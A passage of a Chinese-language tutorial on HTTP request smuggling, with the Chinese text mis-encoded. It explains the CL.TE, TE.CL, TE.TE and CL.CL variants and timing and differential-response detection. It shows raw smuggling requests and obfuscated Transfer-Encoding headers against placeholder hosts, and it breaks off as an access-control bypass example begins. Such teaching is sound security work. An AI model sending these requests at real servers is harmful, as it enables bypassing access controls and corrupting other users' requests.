<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>normal-website.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-abnf">b</span></span><br><span class="line"><span class="language-abnf"><span class="attribute">q</span><span class="operator">=</span>smuggling</span></span><br><span class="line"><span class="language-abnf"><span class="number">0</span></span></span><br></pre></td></tr></table></figure></div>
<p>è¿™ä¸ªä¾‹å­ä¸­ï¼Œæœ‰ä¸¤ä¸ªæ•°æ®å—ï¼Œä¸€ä¸ªæ•°æ®å—æœ‰11å­—èŠ‚çš„å¤§å°(b) å†…å®¹æ˜¯q&#x3D;smugglingï¼Œç¬¬äºŒå—å¤§å°ä¸º0 ä»£è¡¨ç»“æŸ<br>æµè§ˆå™¨é€šå¸¸ä¸ä¼šåœ¨è¯·æ±‚ä¸­ä½¿ç”¨åˆ†å—ç¼–ç ï¼Œå¹¶ä¸”é€šå¸¸ä»…åœ¨æœåŠ¡å™¨å“åº”ä¸­çœ‹åˆ°å®ƒ.</p>
<p>å› ä¸ºHTTP&#x2F;1ä¸­æœ‰è¿™ä¸¤ç§æŒ‡å®šhttpæ¶ˆæ¯é•¿åº¦çš„æ–¹å¼ï¼Œæ‰€ä»¥ä¸€æ¡æ¶ˆæ¯å¯èƒ½ä¼šåŒæ—¶ç”¨ä¸¤ç§æ–¹å¼ï¼Œä»è€Œé€ æˆå†²çªã€‚<br>åœ¨è§„å®šä¸­å¦‚æœè¿™ä¸¤ç§æ–¹å¼åŒæ—¶å‡ºç°ï¼Œåº”è¯¥ä¼˜å…ˆè€ƒè™‘<code>Transfer-Encoding</code>ï¼Œä½†æ˜¯è¿™ç§æ–¹å¼åªåœ¨ä»…æœ‰ä¸€å°æœåŠ¡å™¨çš„æ—¶å€™å¥æ•ˆï¼Œå› ä¸ºå¦‚æœæœ‰å¤šå°æœåŠ¡å™¨ï¼Œå¯èƒ½æœ‰æŸäº›æœåŠ¡å™¨ä¸æ”¯æŒ<code>Transfer-Encoding</code>ï¼Œæˆ–è€…æ”¯æŒçš„æœåŠ¡å™¨åˆè¢«è¯±å¯¼ä¸å¤„ç†å®ƒï¼Œé‚£å°±é€ æˆäº†å‰ç«¯å’Œåç«¯å¯¹<code>Transfer-Encoding</code>æ ‡å¤´çš„å¤„ç†ä¸åŒï¼Œé‚£ä¹ˆå°±å¯èƒ½å¯¹è¿ç»­è¯·æ±‚çš„è¾¹ç•Œå­˜åœ¨æ­§ä¹‰ï¼Œä»è€Œé€ æˆè¯·æ±‚èµ°ç§æ¼æ´</p>
<p>â€”â€”â€”â€”note<br>ç«¯åˆ°ç«¯ä½¿ç”¨ HTTP&#x2F;2 çš„ç½‘ç«™æœ¬è´¨ä¸Šä¸å—è¯·æ±‚èµ°ç§æ”»å‡»çš„å½±å“ã€‚ç”±äº HTTP&#x2F;2 è§„èŒƒå¼•å…¥äº†ä¸€ç§ç”¨äºæŒ‡å®šè¯·æ±‚é•¿åº¦çš„å•ä¸€ã€å¼ºå¤§çš„æœºåˆ¶ï¼Œå› æ­¤æ”»å‡»è€…æ— æ³•å¼•å…¥æ‰€éœ€çš„æ­§ä¹‰ã€‚<br>ç„¶è€Œï¼Œè®¸å¤šç½‘ç«™éƒ½æœ‰æ”¯æŒ HTTP&#x2F;2 çš„å‰ç«¯æœåŠ¡å™¨ï¼Œä½†å°†å…¶éƒ¨ç½²åœ¨ä»…æ”¯æŒ HTTP&#x2F;1 çš„åç«¯åŸºç¡€è®¾æ–½å‰é¢ã€‚è¿™æ„å‘³ç€å‰ç«¯å¿…é¡»æœ‰æ•ˆåœ°å°†æ”¶åˆ°çš„è¯·æ±‚è½¬æ¢ä¸º HTTP&#x2F;1ã€‚æ­¤è¿‡ç¨‹ç§°ä¸º HTTP é™çº§ã€‚è¿™å°±æ¶‰åŠåˆ°äº†é«˜çº§httpè¯·æ±‚èµ°ç§</p>
<h1 id="å¦‚ä½•æ‰§è¡Œhttpè¯·æ±‚èµ°ç§"><a href="#å¦‚ä½•æ‰§è¡Œhttpè¯·æ±‚èµ°ç§" class="headerlink" title="å¦‚ä½•æ‰§è¡Œhttpè¯·æ±‚èµ°ç§"></a>å¦‚ä½•æ‰§è¡Œhttpè¯·æ±‚èµ°ç§</h1><p>é€šå¸¸æ˜¯ç”±<code>Transfer-Encoding</code> <code>Content-Length</code>æ ‡å¤´æ”¾åœ¨åŒä¸€ä¸ªHTTP&#x2F;1è¯·æ±‚ä¸­ï¼Œå¯¹å…¶è¿›è¡Œæ“ä½œï¼Œè®©å‰ç«¯å’Œåç«¯ç”¨ä¸åŒçš„æ–¹å¼å¤„ç†ã€‚å…·ä½“ç”±ä¸¤ä¸ªæœåŠ¡å™¨çš„è¡Œä¸ºå†³å®šï¼š</p>
<ul>
<li><code>CL.TE</code>ï¼šå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨Content-Lengthæ ‡å¤´ï¼Œåç«¯æœåŠ¡å™¨ä½¿ç”¨Transfer-Encodingæ ‡å¤´ã€‚</li>
<li><code>TE.CL</code>ï¼šå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨Transfer-Encodingæ ‡å¤´ï¼Œåç«¯æœåŠ¡å™¨ä½¿ç”¨Content-Lengthæ ‡å¤´ã€‚</li>
<li><code>TE.TE</code>ï¼šå‰ç«¯å’Œåç«¯æœåŠ¡å™¨éƒ½æ”¯æŒTransfer-Encodingæ ‡å¤´ï¼Œä½†å…¶ä¸­ä¸€ä¸ª å¯ä»¥é€šè¿‡æŸç§æ–¹å¼æ··æ·†æ ‡å¤´æ¥è¯±å¯¼æœåŠ¡å™¨ä¸å¤„ç†å®ƒã€‚</li>
</ul>
<p>â€”â€”â€”â€”note<br>è¿™äº›æ–¹å¼åªèƒ½ç”¨åœ¨HTTP&#x2F;1è¯·æ±‚ä¸­ï¼Œåœ¨æµ‹è¯•æ”¯æŒHTTP2çš„ç«™ç‚¹ä¸­è¦åœ¨ Burp Repeater ä¸­æ‰‹åŠ¨åˆ‡æ¢åè®® ä»Inspectoré¢æ¿çš„Request å±æ€§éƒ¨åˆ†æ‰§è¡Œæ­¤æ“ä½œã€‚</p>
<h2 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL.CL"></a>CL.CL</h2><p>æœåŠ¡å™¨é‡è§ä¸€ä¸ªè¯·æ±‚ä¸­åŒ…å«ä¸¤ä¸ªContent-Lengthæ—¶ï¼Œåº”è¯¥è¿”å›400é”™è¯¯ï¼Œä½†ä¸€äº›æœåŠ¡å™¨å¯èƒ½ä¸ä¼šä¸¥æ ¼æ‰§è¡Œè¯¥è§„èŒƒï¼Œæ­¤æ—¶å°±å¯èƒ½å‡ºç°è¯·æ±‚èµ°ç§ã€‚<br>å‰ç«¯ä»£ç†æœåŠ¡å™¨å’Œåç«¯æœåŠ¡å™¨åœ¨æ”¶åˆ°ä¸€ä¸ªåŒ…å«ä¸¤ä¸ªContent-Lengthçš„è¯·æ±‚æ—¶ï¼Œçš†ä¸è¿”å›400ï¼Œä¸”æ­¤æ—¶å‰ç«¯ä»£ç†æœåŠ¡å™¨é‡‡ç”¨çš„æ˜¯ç¬¬ä¸€ä¸ªContent-Lengthï¼Œåç«¯æœåŠ¡å™¨é‡‡ç”¨çš„æ˜¯ç¬¬äºŒä¸ªContent-Length<br>å‡å¦‚æ„é€ è¯·æ±‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVESCRIPT"><figure class="iseeu highlight /livescript"><table><tr><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span><span class="string">\r\n</span></span><br><span class="line">Host: example.com<span class="string">\r\n</span></span><br><span class="line">Content-Length: <span class="number">8</span><span class="string">\r\n</span></span><br><span class="line">Content-Length: <span class="number">7</span><span class="string">\r\n</span></span><br><span class="line"></span><br><span class="line"><span class="number">12345</span><span class="string">\r\n</span></span><br><span class="line">a</span><br></pre></td></tr></table></figure></div>
<p>æ ¹æ®CLçš„é•¿åº¦ä¸åŒï¼Œè¿˜æœ‰aä¼šå‘é€åˆ°åç«¯æœåŠ¡å™¨ä¸­</p>
<h2 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL.TE"></a>CL.TE</h2><p>å‰ç«¯ç”¨Content-Length åç«¯ç”¨ Transfer-Encoding<br>æ”»å‡»ç¤ºä¾‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>13</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">SMUGGLED</span><br></pre></td></tr></table></figure></div>
<p>å‰ç«¯ç”¨Content-Length: 13å‘é€è¯·æ±‚ï¼Œè¡¨ç¤ºæ¶ˆæ¯é•¿åº¦æ˜¯13 ä¹Ÿå°±æ˜¯<code>0\r\n\r\nSMUGGLED</code><br>ä½†æ˜¯åç«¯ç”¨Transfer-Encoding: chunkedå¤„ç†ï¼Œå®ƒçœ‹åˆ°0ä¹‹åå°±ä»¥ä¸ºæ˜¯ç»“æŸï¼ŒSMUGGLEDæ¶ˆæ¯å°±ä¼šè¢«å½“ä½œæ˜¯ä¸‹ä¸€ä¸ªè¯·æ±‚çš„å¼€å§‹</p>
<h2 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE.CL"></a>TE.CL</h2><p>å‰ç«¯ç”¨Transfer-Encoding åç«¯ç”¨Content-Length</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>3</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">8</span><br><span class="line">SMUGGLED</span><br><span class="line">0</span><br></pre></td></tr></table></figure></div>
<p>å‰ç«¯ç”¨Transfer-Encoding åç«¯ç”¨ Content-Length,è¿™æ ·åç«¯åœ¨å¤„ç†çš„æ—¶å€™ï¼Œå°±å¤„ç†åˆ°<code>8\r\n</code>è¿™è¡Œï¼Œåé¢çš„æ²¡æœ‰ç»™å¤„ç†ï¼Œä¼šè¢«å½“ä½œä¸‹ä¸€ä¸ªè¯·æ±‚</p>
<h2 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE.TE"></a>TE.TE</h2><p>åœ¨è¿™é‡Œï¼Œå‰ç«¯å’Œåç«¯æœåŠ¡å™¨éƒ½æ”¯æŒ Transfer-Encoding æ ‡å¤´ï¼Œä½†å…¶ä¸­ä¸€ä¸ªæœåŠ¡å™¨ å¯ä»¥é€šè¿‡ä»¥æŸç§æ–¹å¼æ··æ·† Headers æ¥è¯±å¯¼ä¸å¤„ç†å®ƒã€‚<br>ä¾‹å¦‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line"><span class="params">Transfer-Encoding:</span> xchunked</span><br><span class="line"></span><br><span class="line"><span class="params">Transfer-Encoding :</span> chunked</span><br><span class="line"></span><br><span class="line"><span class="params">Transfer-Encoding:</span> chunked</span><br><span class="line"><span class="params">Transfer-Encoding:</span> x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[space]<span class="params">Transfer-Encoding:</span> chunked</span><br><span class="line"></span><br><span class="line"><span class="params">X:</span> X[\n]<span class="params">Transfer-Encoding:</span> chunked</span><br><span class="line"></span><br><span class="line"><span class="params">Transfer-Encoding</span></span><br><span class="line"><span class="params">:</span> chunked</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>è¿™äº›æŠ€æœ¯ä¸­çš„æ¯ä¸€ç§éƒ½æ¶‰åŠä¸ HTTP è§„èŒƒçš„ç»†å¾®å·®å¼‚ã€‚å®ç°åè®®è§„èŒƒçš„å®é™…ä»£ç å¾ˆå°‘ä»¥ç»å¯¹ç²¾åº¦éµå®ˆå®ƒï¼Œå¹¶ä¸”ä¸åŒçš„å®ç°é€šå¸¸ä¼šå®¹å¿ä¸è§„èŒƒä¸åŒçš„å˜åŒ–ã€‚è¦å‘ç° TE.TE æ¼æ´ï¼Œå¿…é¡»æ‰¾åˆ° Transfer-Encoding æ ‡å¤´çš„ä¸€äº›å˜ä½“ï¼Œä»¥ä¾¿åªæœ‰ä¸€ä¸ªå‰ç«¯æˆ–åç«¯æœåŠ¡å™¨å¤„ç†å®ƒï¼Œè€Œ å…¶ä»–æœåŠ¡å™¨ä¼šå¿½ç•¥å®ƒã€‚<br>æ ¹æ®æ˜¯å‰ç«¯æœåŠ¡å™¨è¿˜æ˜¯åç«¯æœåŠ¡å™¨å¯ä»¥è¢«è¯±ä½¿ä¸å¤„ç†æ··æ·†çš„ Transfer-Encoding æ ‡å¤´ï¼Œæ”»å‡»çš„å…¶ä½™éƒ¨åˆ†å°†é‡‡ç”¨ä¸ CL.TE æˆ– TE ç›¸åŒçš„å½¢å¼ã€‚CL æ¼æ´ã€‚</p>
<h1 id="å¦‚ä½•è¯†åˆ«"><a href="#å¦‚ä½•è¯†åˆ«" class="headerlink" title="å¦‚ä½•è¯†åˆ«"></a>å¦‚ä½•è¯†åˆ«</h1><p><img src="https://pic1.imgdb.cn/item/67dc28b088c538a9b5c21669.png"></p>
<h2 id="ä½¿ç”¨è®¡æ—¶æŠ€æœ¯æŸ¥æ‰¾-HTTP-è¯·æ±‚èµ°ç§æ¼æ´"><a href="#ä½¿ç”¨è®¡æ—¶æŠ€æœ¯æŸ¥æ‰¾-HTTP-è¯·æ±‚èµ°ç§æ¼æ´" class="headerlink" title="ä½¿ç”¨è®¡æ—¶æŠ€æœ¯æŸ¥æ‰¾ HTTP è¯·æ±‚èµ°ç§æ¼æ´"></a>ä½¿ç”¨è®¡æ—¶æŠ€æœ¯æŸ¥æ‰¾ HTTP è¯·æ±‚èµ°ç§æ¼æ´</h2><h3 id="CL-TE-1"><a href="#CL-TE-1" class="headerlink" title="CL.TE"></a>CL.TE</h3><p>å¦‚æœåº”ç”¨ç¨‹åºå®¹æ˜“å—åˆ°è¯·æ±‚èµ°ç§çš„ CL.TE å˜ä½“çš„æ”»å‡»ï¼Œåˆ™å‘é€å¦‚ä¸‹è¯·æ±‚é€šå¸¸ä¼šå¯¼è‡´æ—¶é—´å»¶è¿Ÿï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4</span><br><span class="line"></span><br><span class="line"><span class="language-css"><span class="number">1</span></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">A</span></span></span><br><span class="line"><span class="language-css"><span class="attribute">X</span></span></span><br></pre></td></tr></table></figure></div>
<p>ç”±äºå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨ Content-Length æ ‡å¤´ï¼Œå› æ­¤å®ƒåªä¼šè½¬å‘æ­¤è¯·æ±‚çš„ä¸€éƒ¨åˆ†ï¼Œçœç•¥ Xã€‚åç«¯æœåŠ¡å™¨ä½¿ç”¨ Transfer-Encoding æ ‡å¤´ï¼Œå¤„ç†ç¬¬ä¸€ä¸ªå—ï¼Œç„¶åç­‰å¾…ä¸‹ä¸€ä¸ªå—åˆ°è¾¾ã€‚è¿™å°†å¯¼è‡´å¯è§‚å¯Ÿçš„æ—¶é—´å»¶è¿Ÿã€‚</p>
<h3 id="TE-CL-1"><a href="#TE-CL-1" class="headerlink" title="TE.CL"></a>TE.CL</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>6</span><br><span class="line"></span><br><span class="line"><span class="language-css"><span class="number">0</span></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="attribute">X</span></span></span><br></pre></td></tr></table></figure></div>
<p>ç”±äºå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨ Transfer-Encoding æ ‡å¤´ï¼Œå› æ­¤å®ƒåªä¼šè½¬å‘æ­¤è¯·æ±‚çš„ä¸€éƒ¨åˆ†ï¼Œçœç•¥ Xã€‚åç«¯æœåŠ¡å™¨ä½¿ç”¨ Content-Length æ ‡å¤´ï¼ŒæœŸæœ›é‚®ä»¶æ­£æ–‡ä¸­æœ‰æ›´å¤šçš„å†…å®¹ï¼Œå¹¶ç­‰å¾…å‰©ä½™å†…å®¹åˆ°è¾¾ã€‚è¿™å°†å¯¼è‡´å¯è§‚å¯Ÿçš„æ—¶é—´å»¶è¿Ÿã€‚</p>
<p>è¦æ³¨æ„çš„æ˜¯ï¼Œè¦å…ˆæµ‹è¯•CL.TE å†æµ‹è¯•TE.CL </p>
<h2 id="ä½¿ç”¨å·®åˆ†å“åº”ç¡®è®¤-HTTP-è¯·æ±‚èµ°ç§æ¼æ´"><a href="#ä½¿ç”¨å·®åˆ†å“åº”ç¡®è®¤-HTTP-è¯·æ±‚èµ°ç§æ¼æ´" class="headerlink" title="ä½¿ç”¨å·®åˆ†å“åº”ç¡®è®¤ HTTP è¯·æ±‚èµ°ç§æ¼æ´"></a>ä½¿ç”¨å·®åˆ†å“åº”ç¡®è®¤ HTTP è¯·æ±‚èµ°ç§æ¼æ´</h2><h3 id="CL-TE-2"><a href="#CL-TE-2" class="headerlink" title="CL.TE"></a>CL.TE</h3><p>å½“æ£€æµ‹åˆ°å¯èƒ½çš„è¯·æ±‚èµ°ç§æ¼æ´æ—¶ï¼Œå¯ä»¥é€šè¿‡åˆ©ç”¨å®ƒæ¥è§¦å‘åº”ç”¨ç¨‹åºå“åº”å†…å®¹çš„å·®å¼‚ï¼Œä»è€Œè·å¾—è¯¥æ¼æ´çš„è¿›ä¸€æ­¥è¯æ®ã€‚è¿™æ¶‰åŠå¿«é€Ÿè¿ç»­åœ°å‘åº”ç”¨ç¨‹åºå‘é€ä¸¤ä¸ªè¯·æ±‚ï¼š</p>
<ul>
<li>æ—¨åœ¨å¹²æ‰°ä¸‹ä¸€ä¸ªè¯·æ±‚çš„å¤„ç†çš„ â€œæ”»å‡»â€ è¯·æ±‚ã€‚</li>
<li>ä¸€ä¸ª â€œæ­£å¸¸â€ è¯·æ±‚ã€‚<br>å¦‚æœå¯¹æ­£å¸¸è¯·æ±‚çš„å“åº”åŒ…å«é¢„æœŸçš„å¹²æ‰°ï¼Œåˆ™ç¡®è®¤æ¼æ´</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>11</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">q</span><span class="operator">=</span>smuggling</span></span><br></pre></td></tr></table></figure></div>
<p>æ­¤æ­£å¸¸è¯·æ±‚é€šå¸¸ä¼šæ”¶åˆ°çŠ¶æ€ä»£ç ä¸º 200 çš„ HTTP å“åº”ï¼Œå…¶ä¸­åŒ…å«ä¸€äº›æœç´¢ç»“æœ<br>è¦ç¡®è®¤ CL.TE æ¼æ´ å¯ä»¥å‘é€</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>49</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-routeros">e</span></span><br><span class="line"><span class="language-routeros"><span class="attribute">q</span>=smuggling&amp;x=</span></span><br><span class="line"><span class="language-routeros">0</span></span><br><span class="line"><span class="language-routeros"></span></span><br><span class="line"><span class="language-routeros"><span class="built_in">GET</span> /404 HTTP/1.1</span></span><br><span class="line"><span class="language-routeros">Foo: x</span></span><br></pre></td></tr></table></figure></div>
<p>å¦‚æœæ”»å‡»æˆåŠŸï¼Œåˆ™åç«¯æœåŠ¡å™¨ä¼šå°†æ­¤è¯·æ±‚çš„æœ€åä¸¤è¡Œè§†ä¸ºå±äºæ”¶åˆ°çš„ä¸‹ä¸€ä¸ªè¯·æ±‚ã€‚è¿™å°†å¯¼è‡´åç»­çš„ â€œnormalâ€ è¯·æ±‚å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/404</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Foo</span><span class="punctuation">: </span>xPOST /search HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>11</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">q</span><span class="operator">=</span>smuggling</span></span><br></pre></td></tr></table></figure></div>
<p>æœåŠ¡å™¨å°†ä»¥çŠ¶æ€ä»£ç  404 è¿›è¡Œå“åº”ï¼Œè¿™è¡¨æ˜æ”»å‡»è¯·æ±‚ç¡®å®å¹²æ‰°äº†å®ƒã€‚ ä¹Ÿå°±ç¡®è®¤äº†CL.TEæ¼æ´</p>
<h3 id="TE-CL-2"><a href="#TE-CL-2" class="headerlink" title="TE.CL"></a>TE.CL</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-nix"><span class="number">7</span>c</span></span><br><span class="line"><span class="language-nix">GET <span class="symbol">/404</span> HTTP<span class="symbol">/1.1</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Host:</span> vulnerable-website.com</span></span><br><span class="line"><span class="language-nix"><span class="params">Content-Type:</span> application<span class="symbol">/x-www-form-urlencoded</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Content-Length:</span> <span class="number">144</span></span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix"><span class="attr">x</span><span class="operator">=</span></span></span><br><span class="line"><span class="language-nix"><span class="number">0</span></span></span><br></pre></td></tr></table></figure></div>
<p>å‘é€è¿™ä¸ªæ¶ˆæ¯<br>â€”â€”â€”â€”â€”note<br>è¦ä½¿ç”¨ Burp Repeater å‘é€æ­¤è¯·æ±‚ï¼Œ é¦–å…ˆéœ€è¦è½¬åˆ° Repeater èœå•å¹¶ç¡®ä¿æœªé€‰ä¸­â€œUpdate Content-Lengthâ€é€‰é¡¹ã€‚<br>éœ€è¦åœ¨æœ€åçš„ 0 åé¢åŒ…å«å°¾éšåºåˆ— \r\n\r\nã€‚</p>
<p>å¦‚æœæ”»å‡»æˆåŠŸï¼Œåˆ™åç«¯æœåŠ¡å™¨ä¼šå°† GET &#x2F;404 ä¹‹åçš„æ‰€æœ‰å†…å®¹è§†ä¸ºå±äºæ”¶åˆ°çš„ä¸‹ä¸€ä¸ªè¯·æ±‚ã€‚è¿™å°†å¯¼è‡´åç»­çš„ â€œnormalâ€ è¯·æ±‚å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/404</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>146</span><br><span class="line"></span><br><span class="line"><span class="language-nix">x<span class="operator">=</span></span></span><br><span class="line"><span class="language-nix"><span class="number">0</span></span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix">POST <span class="symbol">/search</span> HTTP<span class="symbol">/1.1</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Host:</span> vulnerable-website.com</span></span><br><span class="line"><span class="language-nix"><span class="params">Content-Type:</span> application<span class="symbol">/x-www-form-urlencoded</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Content-Length:</span> <span class="number">11</span></span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix"><span class="attr">q</span><span class="operator">=</span>smuggling</span></span><br></pre></td></tr></table></figure></div>
<p>æœåŠ¡å™¨å°†ä»¥çŠ¶æ€ä»£ç  404 è¿›è¡Œå“åº”ï¼Œè¿™è¡¨æ˜æ”»å‡»è¯·æ±‚ç¡®å®å¹²æ‰°äº†å®ƒã€‚</p>
<h1 id="åˆ©ç”¨æ¼æ´"><a href="#åˆ©ç”¨æ¼æ´" class="headerlink" title="åˆ©ç”¨æ¼æ´"></a>åˆ©ç”¨æ¼æ´</h1><h2 id="ç»•è¿‡å‰ç«¯å®‰å…¨æ§åˆ¶"><a href="#ç»•è¿‡å‰ç«¯å®‰å…¨æ§åˆ¶" class="headerlink" title="ç»•è¿‡å‰ç«¯å®‰å…¨æ§åˆ¶"></a>ç»•è¿‡å‰ç«¯å®‰å…¨æ§åˆ¶</h2><p>ä¾‹å¦‚ï¼Œå‡è®¾åº”ç”¨ç¨‹åºä½¿ç”¨å‰ç«¯æœåŠ¡å™¨å®ç°è®¿é—®æ§åˆ¶é™åˆ¶ï¼Œä»…å½“ç”¨æˆ·æœ‰æƒè®¿é—®è¯·æ±‚çš„ URL æ—¶ï¼Œæ‰è½¬å‘è¯·æ±‚ã€‚ç„¶åï¼Œåç«¯æœåŠ¡å™¨å°†æ¥å—æ¯ä¸ªè¯·æ±‚ï¼Œè€Œä¸è¿›è¡Œè¿›ä¸€æ­¥æ£€æŸ¥ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒHTTP è¯·æ±‚èµ°ç§æ¼æ´å¯ç”¨äºç»•è¿‡è®¿é—®æ§åˆ¶ï¼Œæ–¹æ³•æ˜¯å°†è¯·æ±‚èµ°ç§åˆ°å—é™åˆ¶çš„ URLã€‚</p>
<p>å‡è®¾å…è®¸å½“å‰ç”¨æˆ·è®¿é—® &#x2F;homeï¼Œä½†ä¸èƒ½è®¿é—® &#x2F;adminã€‚ä»–ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è¯·æ±‚èµ°ç§æ”»å‡»æ¥ç»•è¿‡æ­¤é™åˆ¶ï¼š</p>
